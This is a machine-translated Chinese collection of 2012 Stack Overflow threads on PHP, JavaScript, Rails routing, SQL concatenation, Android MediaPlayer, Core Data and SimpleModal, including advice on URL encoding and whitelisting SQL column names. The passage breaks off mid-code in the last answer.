我认为您使用的脚本或 phantomjs 没有任何问题（至少在 v1.5 中）。

如果您尝试此脚本：

```
var page = require('webpage').create(),
    system = require('system'),
    t, address;

page.settings.userName = 'test';
page.settings.password = 'test';

if (system.args.length === 1) {
    console.log('Usage: loadspeed.js <some URL>');
    phantom.exit();
} else {
    t = Date.now();
    address = system.args[1];
    page.open(address, function (status) {
        if (status !== 'success') {
            console.log('FAIL to load the address');
        } else {
            t = Date.now() - t;
            console.log('Page title is ' + page.evaluate(function () {
                return document.title;
            }));
            console.log('Loading time ' + t + ' msec');
        }
        phantom.exit();
    });
} 
```

phantomjs loadspeed.js [http://browserspy.dk/password-ok.php](http://browserspy.dk/password-ok.php)

鉴权成功。

# php - RSS 和 PHP 合并

> ID：10114926
> 
> 赞同：-1
> 
> 时间：2012-04-11T22:32:58.140
> 
> 标签：php, rss

我有以下代码，这会导致我出现一些问题

```
<?PHP
 include("../panel/config.php");
 #// Timetable Clearup Variabls
$yesterday = strtotime('yesterday');
$yesterdow = date('l',$yesterday);
$order = "SELECT * FROM timetable WHERE day = '$yesterdow' ORDER BY time";
$result = mysql_query($order);
$yesterdayd = date('F jS, Y', time()-86400);

    //SET XML HEADER
    header('Content-type: text/xml');

    //CONSTRUCT RSS FEED HEADERS
    $output = '<rss version="2.0">';
    $output .= '<channel>';
    $output .= "<title>Timetable - {$yesterdayd} </title>";
    $output .= '<description>Timetable.</description>';
        $output .= '<link>www.site.com</link>';
     while ($row = mysql_fetch_array($result)) {
    //BODY OF RSS FEED
   $output .= '<item>';
     $output .= "<description>" . htmlspecialchars($row['time']) . " " . htmlspecialchars($row['username']) . "</description>";
   $output .= '</item> ';
 }
    //CLOSE RSS FEED
   $output .= '</channel>';
   $output .= '</rss>';

    //SEND COMPLETE RSS FEED TO BROWSER
$filename = "timetable.xml";

                if (!$handle = fopen($filename, 'w')) {
            echo "Cannot open file ($filename)";
            exit;
            }

            // Write $somecontent to our opened file.
            if (fwrite($handle, $output) === FALSE) {
            echo "Cannot write to file ($filename)";
            exit;
            }

            if (fwrite($handle, $total) === FALSE) {
            echo "Cannot write to file ($filename)";
            exit;
            }

            echo "Success, wrote {$content}{$total} to file ($filename)";

            fclose($handle);

?> 
```

这会导致创建一个 .xml RSS 提要，但是一切都在它自己的个人中`<item></item>`，`<description></description>`这会导致麻烦。有没有办法包装`<item><discussion>`所有内容`</discussion></item>`

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T22:45:08.930

将您的循环修改为：

```
$output .= '<item><description>';
while ($row = mysql_fetch_array($result))
{
  //BODY OF RSS FEED
  $output .= htmlspecialchars($row['time']) . " " . htmlspecialchars($row['username']) . "<br/>";
}
$output .= '</description></item> '; 
```

本质上，您不希望每个项目都输出`item`and`description`标记，因此它们属于循环之外。

# wordpress - 多个 div 中的 Wordpress 帖子

> ID：10114930
> 
> 赞同：0
> 
> 时间：2012-04-11T22:33:34.787
> 
> 标签：wordpress, post, html

嗨，我需要在 3 个单独的 div 中有 3 个单独的帖子。

像这样：

div 1 发布内容...

div 2 发布的内容 div

div 3 帖子内容

我希望能够在仪表板的可视化/html 编辑器中添加帖子，并在 3 个 div 的同一页面上显示此内容。做这个的最好方式是什么？谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T22:37:14.703

我会将自定义字段添加到帖子类型。这将允许您将所需的任何字段添加到帖子类型，然后您可以在输出中以您希望的任何方式显示它们。看一下[https://github.com/jaredatch/Custom-Metaboxes-and-Fields-for-WordPress](https://github.com/jaredatch/Custom-Metaboxes-and-Fields-for-WordPress)的简单方法。

# javascript - 如何使用Javascript按日期和时间排序

> ID：10114931
> 
> 赞同：-1
> 
> 时间：2012-04-11T22:33:36.863
> 
> 标签：javascript

我编写了一个脚本来帮助我转换从段落中复制数字并将它们重新输入表格的非常冗长而乏味的任务。

但是，我需要能够按日期对这些“段落”进行排序，然后在每个日期内，它们必须按时间排序（我知道 3333Z 不是有效时间，这仅用于测试并确保它排序正确）。

这就是它需要显示为最终产品的方式。我的代码构建了该表的 CSV 版本，我将其粘贴到 Excel 中以获取该表。

```
March 4
--------------------------------------------------------------------------------------
|  Value 1    |  Value 2    |  Value 3    |  Value 4     |   Value 3    |  Value 6   |
--------------------------------------------------------------------------------------
|     1111Z   |     1111Z   |   12345.67  |  123456.123  |    123.123   |   456.78   |
--------------------------------------------------------------------------------------
|     2222Z   |     2222Z   |   12345.67  |  123456.123  |    123.123   |   456.78   |
--------------------------------------------------------------------------------------
|     3333Z   |     3333Z   |   12345.67  |  123456.123  |    123.123   |   456.78   |
--------------------------------------------------------------------------------------

March 12
--------------------------------------------------------------------------------------
|  Value 1    |  Value 2    |  Value 3    |  Value 4     |   Value 3    |  Value 6   |
--------------------------------------------------------------------------------------
|     1111Z   |     1111Z   |   12345.67  |  123456.123  |    123.123   |   456.78   |
--------------------------------------------------------------------------------------
|     2222Z   |     2222Z   |   12345.67  |  123456.123  |    123.123   |   456.78   |
--------------------------------------------------------------------------------------
|     3333Z   |     3333Z   |   12345.67  |  123456.123  |    123.123   |   456.78   |
--------------------------------------------------------------------------------------

March 29
--------------------------------------------------------------------------------------
|   Value 1   |  Value 2    |  Value 3    |  Value 4     |   Value 3    |  Value 6   |
--------------------------------------------------------------------------------------
|     1111Z   |     1111Z   |   12345.67  |  123456.123  |    123.123   |   456.78   |
--------------------------------------------------------------------------------------
|     2222Z   |     2222Z   |   12345.67  |  123456.123  |    123.123   |   456.78   |
--------------------------------------------------------------------------------------
|     3333Z   |     3333Z   |   12345.67  |  123456.123  |    123.123   |   456.78   |
-------------------------------------------------------------------------------------- 
```

我有一个名为 line1field2 的值，它具有 DDHHHHZ 格式的日期和时间。在上面的示例中，DD 将给出 4、12 和 29。然后必须按时间 (HHHH) 排序才能创建表部分。

我知道这可以用其他语言完成，但是由于系统要求，这必须是纯 JavaScript，没有像 jQuery 这样的库，它必须与 FireFox 3.6.3 一起使用。

下面的代码有效，但它没有按日期分隔。

另外，我想将其保存为 CSV 文件（或保留表格格式的文件）作为最终输出，我知道我可以使用 PHP，但我认为我不能使用 JavaScript 来做到这一点。如果有人知道可以做到这一点的方法，请告诉我。

如果我有什么不清楚的地方，请询问，我会尽力解释得更好。

谢谢

```
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
    <html xmlns="http://www.w3.org/1999/xhtml">
    <head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <title>Converter</title>
    <style type="text/css">
    body {
        background: #C8C8C8;
        margin: 10px;
        font-size: 100%;
    }

    .floatstop {
        clear: both;
    }

    .hidden {
        display: none;
    }

    .unhidden {
        display: block;
    }

    #button {
        margin: 0px auto;
    }

    #instruction {
        margin: 5px;
        width: 500px;
    }

    #workspace {
        background: #FFFFFF;
        float: left;
        margin: 0px auto;
        height: 300px;
        width: 505px;    
        border-style: ridge;
        border-width: 5px;
        border-color: gray;
    }

#outer {
    background: #F0F0F0;
    width: 1035px;
    margin: 0px auto;
    padding: 10px;
    border-style: solid;
    border-width: 3px;
    border-color: black;
}

#preview {
    background:   #FFFFFF;
    float: right;
    margin: 0px auto;
    height: 300px;
    width: 505px;
    border-style: ridge;
    border-width: 5px;
    border-color: gray;
}

#viewCSV {
    width: 500px;    
}

#viewHTML {
    width: 500px;
}
</style>
</head>
<body>
<script type="text/javascript" language="JavaScript">

//Select text function in Preview textarea
function selectText(id) {
    document.getElementById(id).focus();
    document.getElementById(id).select();
}

//Trim leading zeros    
function trimNumber(s) {
    while (s.substr(0, 1) == '0' && s.length > 1) { s = s.substr(1, 9999); }
    return s;
}

//Trim leading zeros, but leave two digits before decimal point
function trimNumber2(s) {
    while (s.substr(0, 2) == '00' && s.length > 1) { s = s.substr(1, 9999); }
    return s;
}

var row = [];
var results = [];

function conversionCode() {
    var pastedText = document.getElementById("pastedText").value; //get text from input
    var para = pastedText.split("\n\n");
    var i = 0;
    for (i = 0; i < para.length; i++) { //start conversion loop
        var report = para[i];

        //Arrays are zero-based.
        var splitLines     = report.split('//');
        var line1Arr       = splitLines[0];
        var line2Arr       = splitLines[1];
        var line3Arr       = splitLines[2];
        var line4Arr       = splitLines[3];
        var line5Arr       = splitLines[4];

        //Break out FIRST line.
        var lineAAA        = splitLines[0].split('/');
        var datasetName1   = lineAAA[0];
        var line1field1    = lineAAA[1];
        var line1field2    = lineAAA[2];
        var line1field3    = lineAAA[3];
        var line1field4    = lineAAA[4];
        var line1field5    = lineAAA[5];
        var line1field6    = lineAAA[6];
        var line1field7    = lineAAA[7];
        var line1field8    = lineAAA[8];
        var line1field9    = lineAAA[9];

        //Break out SECOND line.
        var lineBBBBB      = splitLines[1].split('/');
        var datasetName2   = lineBBBBB[0];
        var line2field1    = lineBBBBB[1];
        var line2field2    = lineBBBBB[2];
        var line2field3    = lineBBBBB[3];
        var line2field4    = lineBBBBB[4];
        var line2field5    = lineBBBBB[5];
        var line2field6    = lineBBBBB[6];
        var line2field7    = lineBBBBB[7];

        //Break out THIRD line.
        var lineCCC        = splitLines[2].split('/');
        var dataSetName3   = lineCCC[0];
        var line3field1    = lineCCC[1];
        var line3field2    = lineCCC[2];
        var line3field3    = lineCCC[3];
        var line3field4    = lineCCC[4];
        var line3field5    = lineCCC[5];

        //Break out FOURTH line.
        var lineDDDD1      = splitLines[3].split('/');
        var dataSetName4   = lineDDDD1[0];
        var line4field1    = lineDDDD1[1];
        var line4field2    = lineDDDD1[2];
        var line4field3    = lineDDDD1[3];
        var line4field4    = lineDDDD1[4];
        var line4field5    = lineDDDD1[5];
        var line4field6    = lineDDDD1[6];
        var line4field7    = lineDDDD1[7];

        //Break out FIFTH line.
        var lineDDDD2      = splitLines[4].split('/');
        var dataSetName5   = lineDDDD2[0];
        var line5field1    = lineDDDD2[1];
        var line5field2    = lineDDDD2[2];
        var line5field3    = lineDDDD2[3];
        var line5field4    = lineDDDD2[4];
        var line5field5    = lineDDDD2[5];
        var line5field6    = lineDDDD2[6];
        var line5field7    = lineDDDD2[7];

        //Change variables to correct formating
        //date - selecting and validating the date from line1field2
        var date = line1field2.slice(0, -5);
        var min = 1;
        var max = 31;
        var num = parseInt(date);
        if (min > num || max < num) {
            alert('Invalid date');
            exit();
        }

        //Time - Correcting format
        line1field2 = line1field2.slice(2);
        line1field3 = line1field3.slice(2);

        //line3field1 - remove letters from end of field, remove leading zeros
        line3field1 = line3field1.slice(0, -3);
        line3field1 = trimNumber(line3field1);

        //line3field3 - Split field on ':'
        line3field3 = line3field3.split(':');
        line3field3 = line3field3[1];

        //line4field1 - Split field on ':', and removing leading zeros
        line4field1 = line4field1.split(':');
        line4field1 = line4field1[1];
        line4field1 = trimNumber(line4field1);

        //line3field5 - Remove leading zeros, but keep at least two numbers before the
        //decimal point (Example: 01.123)
        line3field5 = line3field5.split(':');
        line3field5 = line3field5[1];
        line3field5 = trimNumber2(line3field5);

        //Create Array for each row in table.
        row[row.length] = line1field2;
        row[row.length] = line1field3;
        row[row.length] = line3field1;
        row[row.length] = line3field3;
        row[row.length] = line4field1;
        row[row.length] = line3field5;

        //Add each report's data to array'
        results.push(row);

        //Remove data from row for next loop 
        row = [];

    }

    //Sort results array for display
    results = results.sort();

    //Build HTML table

    //Build CSV text  
    resultsHeader = "Value 1,Value 2,Value 3,Value 4,Value 5,Value 6" + "\n";
    document.getElementById("plainOutput").innerHTML = resultsHeader;

    for (i = 0; i < results.length; i++) {
        document.getElementById("plainOutput").innerHTML += results[i] + "\n";
    }

};

</script>

<div id="outer">
    <h1 align="center">CONVERTER</h1>
    <div id="workspace">
    <h2 align="center">Workspace</h2>      
    <form action="" method="get" id="inputForm">
    <textarea id="pastedText" style="width:500px" rows="10"></textarea>
        <div id="button" class="floatstop">
        <p><input type="button" value="Convert" onclick="conversionCode ()"></p>    
        </div>
    </form>
    </div>
    <div id="preview">
    <h2 align="center">Preview</h2>
        <div id="viewCSV"> 
        <form action="" method="get" name="csvDisplay">  
        <textarea id="plainOutput" style="width: 500px" rows="10" readonly="readonly" onClick="selectText('plainOutput')"></textarea>
        <p><input type="button" value="Select Text" onClick="selectText('plainOutput')"/></p>
        </form>
        </div>
    </div>
    <div id="instruction" > 
    <p style="margin-left: 20px"><strong>Instructions:</strong></br>
    <ol>
        <li>Paste text into the Workspace.</li>
        <li>Click the "Convert" button.</li>
        <li>Cclick on the text or the Select button at the bottom to select 
            the text.</li>
        <li>You <strong>must</strong> copy the text by either Right-clicking 
            and choose Copy or by pressing Control+C.</li>
        <li>Paste the text into Excel as CSV.</li>
        <li>Format table as necessary.</li>
        <li>Select table and paste into product.</li>
    </ol>
    </div>
</div>
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-12T02:00:25.917

将“时间”转换为[`Date()`](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Date)对象（拆分字符串，转换为数字，输入构造函数）。

然后使用[`sort()`](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Array/sort)您的日期数组的方法。使用自定义 compareFunction，您可以轻松地对日期进行排序。查看链接文档中的数字比较函数：它也适用于 Date 对象，因为它将被隐式转换为数字。

之后，您将能够将数组拆分为每个日期的子数组。

# ruby-on-rails-3 - Rails 3.1 如何为“我”创建指向用户资源的 API 路由

> ID：10114933
> 
> 赞同：8
> 
> 时间：2012-04-11T22:33:42.133
> 
> 标签：ruby-on-rails-3, routes

我在 Rails 中有一组 API 路由，如下所示

```
namespace "api" do
   namespace "v1" do
     resources :users do
       resources :posts
       resources :likes
       ...
     end
   end
end 
```

到目前为止，一切都很好。我可以 GET /api/v1/users/fred_flintstone 并检索该用户的所有信息。

我现在想做的是添加“我”（ala facebook）的概念，这样如果用户经过身份验证（fred_flintstone），我还可以执行以下操作

获取 /api/v1/我

获取 /api/v1/me/posts

...

我需要两组路线。所以我想使用 GET /api/v1/me/posts 或 GET /api/v1/users/fred_flintstone/posts 来获得相同的结果。

我已经完成了路线教程，并在谷歌上搜索过，因此指针将与直接答案一样受到赞赏。

编辑：

我所做的很有效。我使用范围在路由表中创建了第二组条目：

```
scope "/api/v1/me", :defaults => {:format => 'json'}, :as => 'me' do
  resources :posts, :controller => 'api/v1/users/posts'
  resources :likes, :controller => 'api/v1/users/likes'
  ...
end 
```

然后我添加了一个 set_user 方法来测试 params[:user_id] 的存在。我真的在寻找一种方法来干燥它。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-14T04:37:16.007

将路由保留在您的帖子中的方式，然后在控制器中解决这个问题怎么样？

Heres a`before_filter`您可以将其应用于您拥有的`User`从 a中提取 a 的所有路线`:user_id`。

```
# Set the @user variable from the current url; 
# Either by looking up params[:user_id] or
# by assigning current_user if params[:user_id] = 'me'
def user_from_user_id
  if params[:user_id] == 'me' && current_user
    @user = current_user
  else
    @user = User.find_by_user_id params[:user_id]
  end

  raise ActiveRecord::RecordNotFound unless @user
end 
```

然后在您的控制器函数中，您可以只使用该`@user`变量而不必担心用户是否传递了 a`user_id`或`me`.

希望有帮助！:)

编辑：

鉴于您的评论，让我再拍一张。

一个功能如何列出您希望通过标准路由和`/me`路由访问的所有资源。然后，您可以在所需的两个命名空间中使用该函数。

### 路线.rb

```
# Resources for users, and for "/me/resource"
def user_resources
  resources :posts
  resources :likes
  ...
end

namespace 'api' do
   namespace 'v1' do
     resources :users do
       user_resources
     end
   end
end

scope '/api/v1/:user_id', :constraints => { :user_id => 'me' },
                          :defaults => {:format => 'json'}, :as => 'me' do
  user_resources
end

# We're still missing the plain "/me" route, for getting
# and updating, so hand code those in
match '/api/v1/:id' => 'users#show', :via => :get,
                                     :constraints => { :id => 'me' }                
match '/api/v1/:id' => 'users#update', :via => :put,
                                       :constraints => { :id => 'me' } 
```

# sql - 在一列中连接多条记录

> ID：10114943
> 
> 赞同：0
> 
> 时间：2012-04-11T22:35:04.377
> 
> 标签：sql, sql-server-2008, concatenation

我有三张桌子：

1-

```
employee(emp_id,emp_name) values(1,"ahmed mohamed") 
```

2-

```
attach_emp(emp_id [f.k] ,attach_id[f.k]) junction table

values(1,1)
values(1,2) 
```

3-

```
attachment(attach_id,attachname)

values(1,"a")
values(2,"b") 
```

我希望结果是：

```
emp_id   emp_name        Attachment
1        ahmed mohamed   a,b 
```

如何在记录之间进行连接和连接？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T22:42:22.260

这里有一篇看起来相当不错的文章，可能会有一些用处：

[http://www.simple-talk.com/sql/t-sql-programming/concatenating-row-values-in-transact-sql/](http://www.simple-talk.com/sql/t-sql-programming/concatenating-row-values-in-transact-sql/)

特别是，标题为“在项目数未知时连接值”的部分看起来很相关，因为它的价值。

# android - mediaPlayer.release() 导致 onPause() 超时 - 摩托罗拉 Xoom 家庭版

> ID：10114944
> 
> 赞同：0
> 
> 时间：2012-04-11T22:35:06.357
> 
> 标签：android

我遇到了一个奇怪的问题，它只出现在摩托罗拉 Xoom 家庭版上，而不是在其他十个测试设备上——甚至摩托罗拉 Xoom Wi-Fi 版上都没有。

经过许多令人沮丧的实验，这似乎是发生了什么：如果我准备一个 MediaPlayer，使用一个不是很小的文件，然后尝试在 onPause 中释放播放器而没有调用 mediaPlayer.start()，然后释放（ ) 挂起 onPause（我收到一条 LogCat 消息说 onPause 超时）并且屏幕变黑。我必须按主页，转到管理应用程序并强制应用程序停止，否则它将只是一个永久的、无响应的黑屏，而不会出现“应用程序无响应”对话框。

为什么会这样？我怎样才能防止这个问题发生？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T22:55:50.347

这是一个丑陋的黑客，所以我希望有人有更好的答案，但这是我的解决方法。

每当我播放录音时，我都会设置一个标志。然后在 onPause 我运行：

```
if (!everPlayed) {
mediaPlayer.start();
mediaPlayer.release();
} 
```

# php - 提交 SQL 查询时是否需要验证列名？

> ID：10114949
> 
> 赞同：0
> 
> 时间：2012-04-11T22:35:31.667
> 
> 标签：php, mysql, pdo, sql-injection

在我的 SQL 查询中，我从用户填写的表单中提交数据，如此处所示[，](https://stackoverflow.com/questions/8884220/dealing-with-quotes-added-by-pdoprepare)无法使用 PDO 参数化我的列名。这很重要，因为查询中的列名是根据表单中的字段名动态插入的。

我可以很容易地验证 $_POST 数组中提交的列名，只需将它们从数据库中拉出并丢弃任何不匹配的列名。这是避免 SQL 注入的好事还是只是浪费系统资源（因为它有效地使依赖于数据库的任何请求的执行加倍）？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T22:41:03.857

除了对列列表进行硬编码之外，您还可以通过数据库中的另一个表构建列列表，您希望允许从中查询列，例如

```
QuerableSources
SrcTable      SrcColumn      DescriptToUser
SomeTable     SomeColumn     Column used for
AnotherTable  AnotherColumn  Something Else
etc. 
```

然后，例如为用户构建一个组合框以选择“DescriptionToUser”内容以便于阅读，并控制有效的列和表源。

至于他们正在寻找的价值，一定要擦洗/清理它以防止 SQL 注入。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-12T05:30:40.157

> 这是避免 SQL 注入的好方法吗

不。

> 或者只是浪费系统资源

不。

它不能浪费，因为它只是系统表中的一个简单选择。

但是当用户不允许进入某些字段时，它仍然可以是某种注入。比如说，如果站点管理员填写了一个（虚构的）字段“user_role”，并且用户可以在 POST 中定义它，他们可以更改他们的访问权限。

因此，硬编码（白名单）允许的字段是唯一可靠的方法。

> 因为它有效地使依赖于数据库的任何请求的执行加倍

男人。打算查询的数据库。这是他们唯一的目的。不能支持简单选择查询的数据库是无稽之谈。查询不同。插入一个比 10 个选择要重得多。您必须按质量而不是数量来区分查询。

> 查询中的列名是根据表单中的字段名动态插入的。

虽然对于插入/更新查询来说这是非常正确的，但对于 SELECT 查询来说，这是糟糕设计的一个重要标志。我可以在 WHERE/ORDER BY 子句中使用变量字段名称，但是如果您必须在表名称子句的字段集中进行操作 - 您的数据库设计肯定是错误的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-11T22:37:47.860

您可以对列名进行硬编码以使其更快。您还可以缓存拉取的表描述，这样您就不需要在每次表架构更改时更新代码。

# ios - NSFetchRequest 没有看到 NSManagedObjectContext 中关系的变化

> ID：10114951
> 
> 赞同：0
> 
> 时间：2012-04-11T22:35:41.993
> 
> 标签：ios, core-data

我正在为核心数据使用 UIManagedDocument。我的 managedObjectContext 中有日历对象，它们有一个`calendarSelected`属性。Calendar 实体与 CalendarEntry 具有一对多关系。

当我更改它们的`calendarSelected`属性然后执行 NSFetchRequest 以获取具有以下谓词的 CalendarEntry 对象时：

`[NSPredicate predicateWithFormat:@"calendar.calendarSelected = YES"]`

在没有我打电话的情况下，calendar.calendarSelected 似乎没有看到我所做的更改

`[myManagedDocument saveToURL:myManagedDocument.fileURL forSaveOperation:UIDocumentSaveForOverwriting completionHandler:^(BOOL success) {}];`

第一的。我在某处读到，即使更改尚未写入持久存储，从同一上下文中获取内容也应该尊重在该上下文中所做的更改。我错过了什么？

更新：

当 calendarEvents 关系出现故障时，它似乎正在发生：`calendarEvents = "<relationship fault: 0x91aec90 'calendarEvents'>";`但在关系没有故障时起作用。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T23:52:55.860

如果问题仅出现在由一对多关系指向的新插入的 CalendarEntry 对象上，那么它们可能还没有永久对象 ID。这很容易调试，只需转储对象 ID 并检查它是临时的还是永久的。

当保留一对多关系中的包含对象时，我已经看到了这种情况；似乎只要保留它，关系中的多对包含对象就永远不会达到它们获得永久ID的程度。通过将应用程序置于后台并重新启动它有点容易调试；后台处理通常会强制 UIManagedDocument 保存，之后事情将开始按您的预期工作，因为 CalendarEntry 实体将被分配永久 ID，因此将变得可获取。

就保存 UIManagedDocument 而言，您无法控制在使用 UIManagedDocument 时何时会发生这种情况。最好的办法是通过 updateChangeCount:UIDocumentChangeDone 安排将来发生的保存，但同样，它会“很快”发生，但不是确定性的，即不可能知道它何时会发生。

要解决临时与永久对象 id 的问题，如果这是您所看到的，请在 NSManagedObjectContext 上尝试以下类别；在您完成插入新的 CalendarEntry 对象后调用它，以强制执行该问题。

```
// Obtain permanent ids for any objects that have been inserted into
// this context.
//
// As of this writing (iOS 5.1), we need to manually obtain permanent
// ids for any inserted objects prior to a save being performed, or any
// objects that are currently retained, that have relationships to the
// inserted objects, won't be updated with permanent ids for the related
// objects when a save is performed unless the retained object is refetched.
// For many objects, that will never occur, so we need to force the issue.

- (BOOL)obtainPermanentIDsForInsertedObjects:(NSError **)error
{
    NSSet * inserts = [self insertedObjects];

    if ([inserts count] == 0) return YES;

    return  [self obtainPermanentIDsForObjects:[inserts allObjects]
                                         error:error];
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-12T02:54:51.027

基本上，在进行任何更改后，您必须使用撤消管理器，或调用 [document updateChangeCount:UIDocumentChangeDone]; 就这样！任何其他“保存”调用只会在某处破坏其他内容。

更新的规范方法应该是......

你知道你在主线程上

```
NSManagedObjectContext *ctx = document.managedObjectContext;
// Do stuff with it
[document updateChangeCount:UIDocumentChangeDone]; 
```

你在不同的线程上

```
[document.managedObjectContext performBlock:^{
    // Do stuff with it on the main thread
    [document updateChangeCount:UIDocumentChangeDone];
}]; 
```

或者

```
NSManagedObjectContext *moc = [[NSManagedObjectContext alloc] initWithConcurrencyType:NSPrivateQueueConcurrencyType];
moc.parentContext = document.managedObjectContext;
[moc performBlock:^{
    // Do stuff with it on a background thread
    // Push changes up to parent (which is the document's main MOC)
    // The document will know it's dirty and save changes
    [moc save:&error];
}]; 
```

或者，如果您想在后台线程中进行更改，而不会弄乱主文档 MOC，请在父文档中进行更改……主 MOC 将在下一次提取之前看到它们。

```
[document.parentContext.managedObjectContext performBlock:^{
    // Do stuff with it on a background thread, but the main MOC does not
    // see the changes until it does a fetch.
}]; 
```

# php - PHP撇号问题

> ID：10114956
> 
> 赞同：2
> 
> 时间：2012-04-11T22:36:15.153
> 
> 标签：php, sql, apostrophe

我得到了一个我无法修改其内容的数据库。一切都很顺利，直到我通过链接在 URL 中传递了一些变量，并且其中一个变量（即“弗兰克的二手车”）中的撇号导致其后面的变量不被传递。

这是目前正在通过的：

```
&var1=600&miles=44000&var2=Frank 
```

什么时候应该是这样的：

```
&var2=600&miles=44000&var2=Frank's%20Used%20Cars%20&var3=111111111 
```

正如我所说，问题出在撇号上。我尝试将 PHP myadmin 数据库中的“经销商”字段更改为“utf8_swedish_ci”，并在 MySQL 连接排序规则中将其更改为“latin1_swedish_ci”。

显然，如果我把撇号去掉，一切都很好，但我不能这样做。任何帮助都会很棒！

```
 echo"<td>";
                echo$row->var1;
            echo"</td>";
            echo"<td>";
                echo$row->var2;
            echo"</td>";
            echo"<td>";
                echo$row->dealer;
            echo"</td>";
            echo"<td><a href='look.php?price=$row->price&miles=$row->miles&dealer=$row->dealer'>More Info</a> 
```

动态网址链接：

```
echo"<td>";
                $url="look.php?make=".urlencode($row->make)."&model=".urlencode($row->model)."&colour=".urlencode($row->colour)."&Reg=".urlencode($row->Reg)."&miles=".urlencode($row->miles)."&price=".urlencode($row->price)."&region=".urlencode($row->region)."&miles=".urlencode($row->miles);
            echo"$urlHTML=htmlspecialchars($url)"; 
            echo "<a href=\"$urlHTML\">More Info</a>";
            echo"</td>"; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-08-19T12:49:56.517

已经提到了 SQL 注入，也提到了 urlencode，但是从你的问题中不清楚数据在什么时候被破坏了。

但是解决方案，无论它在哪里中断都是相同的：

1.  总是在离开 PHP 的地方转义数据
2.  始终根据数据的去向使用适当的方法来转义数据

要将数据写入 URL，请使用 urlencode。

要将数据写入 HTML，请使用 htmlentities()

将数据写入 XML 使用[htmlspecialchars](https://stackoverflow.com/questions/2822774/php-is-htmlentities-sufficient-for-creating-xml-safe-values) ()

要将字符串数据写入 7 位电子邮件，请使用quoted_printable_encode()

要将二进制数据写入电子邮件，请使电子邮件 MIME 和 base64 对数据进行编码或使用 uuencode()

要将数据写入 MySQL 查询字符串，请使用 mysql[i]_real_escape_string() 或参数绑定

...

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T22:38:49.723

参考[这个功能](http://php.net/manual/en/function.urlencode.php)。在你构建了你的 url 字符串之后，它会让你自动转义它，这样问题就不会出现 - 或者许多其他人喜欢它。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-12T07:59:44.103

首先，有一些字符需要在 URL 中转义，所以使用[urlencode](http://php.net/urlencode)来构建你的 url。

```
$url="look.php?price=".urlencode($row->price).
   "&miles=".urlencode($row->miles).
   "&dealer=".urlencode($row->dealer); 
```

这将确保您的 URL 按预期工作。这应该可以解决您的特定问题，但是如果您想生成有效的 HTML（为什么不这样做！），您可以使用[htmlspecialchars为 HTML 编码该 URL](http://php.net/htmlspecialchars)

```
$urlHTML=htmlspecialchars($url); 
echo "<td><a href=\"$urlHTML\">More Info</a>"; 
```

* * *

## 回答 #4

> 赞同：-2
> 
> 时间：2012-04-11T22:42:41.740

试试： $code = str_replace("'", "\'", $code);

# php - SimpleModal Foreach 循环动态内容

> ID：10114960
> 
> 赞同：-1
> 
> 时间：2012-04-11T22:36:40.487
> 
> 标签：php, javascript, jquery, ajax, simplemodal

您将如何在 foreach 循环中使用 simplemodal 以使其不重复相同的信息？

例子：

```
foreach($ret as $v)
{
        <div id='osx-modal'>
        <input type='button' name='osx' value='View' class='osx demo'/>
        </div>

        <div id="osx-modal-content">
            <div class="close"><a href="#" class="simplemodal-close">x</a></div>
                <div id="osx-modal-data">                                                                                               
                    <div id="toon_box">

                        <div id="toon_name">
                            <?php echo $v['toon_name'];?>
                        </div>

            <div id="toon_avatar">
                            <?php echo '<img src="' . $v['avatar'] . '" alt="" />';?>
                        </div>
                    </div>
                </div>
} 
```

元数据是从网站上的用户那里提取的，并以单独的模态显示每个用户的元数据。为了澄清起见，假设 foreach 重复了 10 次，因为数据库中有 10 个用户。这将为每个用户创建 10 个单独的按钮，当您单击模态框时会弹出其中的数据。

问题是，当您单击每个按钮时，每个模式框中的同一用户。您将如何设置它以便每个模式框显示正确的用户元数据。我已经检查了 simplemodal.js 中的持久性是否设置为 false 并且确实如此。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T23:53:59.377

您在同一个模型框中拥有相同元数据的原因是因为这行代码

```
<input type='button' name='osx' value='View' class='osx demo'/> 
```

using`class`非常通用，因此您应该`id`在每个按钮都有自己的地方使用`uniqid`

```
<input type='button' name='osx' value='View' id='os1'/>
<input type='button' name='osx' value='View' id='os2'/> 
```

现在你`<div id="osx-modal-content">`也看起来像这样

```
<div id="osx-modal-content1">
<div id="osx-modal-content2"> 
```

你`javascript`看起来像这样

```
$("os1").addEvent("click", function(){
  var SM = new SimpleModal();
      SM.show({
        "title":"Title",
        "contents": $("#osx-modal-content1").html()
      });
});

$("os2").addEvent("click", function(){
  var SM = new SimpleModal();
      SM.show({
        "title":"Title",
        "contents": $("#osx-modal-content2").html()
      });
}); 
```

可以使用查看所有内容的映射方式吗？？？这就是你在每个模型中实现每个内容的人

如果您需要更多信息，请与我们联系

**编辑 1 个示例**

```
<?php
$x = 0;
foreach ( $ret as $v ) {
    $x ++;
    $content = "
    <script type=\"text/javascript\">addModal($x)</script>
    <div id='osx-modal'>
        <input type='button' name='osx' value='View' id='osx{$x}'/>
        </div>
        <div id=\"osx-modal-content{$x}\">
            <div class=\"close\"><a href=\"#\" class=\"simplemodal-close\">x</a></div>
                <div id=\"osx-modal-data\">                                                                                               
                    <div id=\"toon_box\">
                        <div id=\"toon_name\">
                        {$v['toon_name']}
                        </div>
            <div id=\"toon_avatar\">
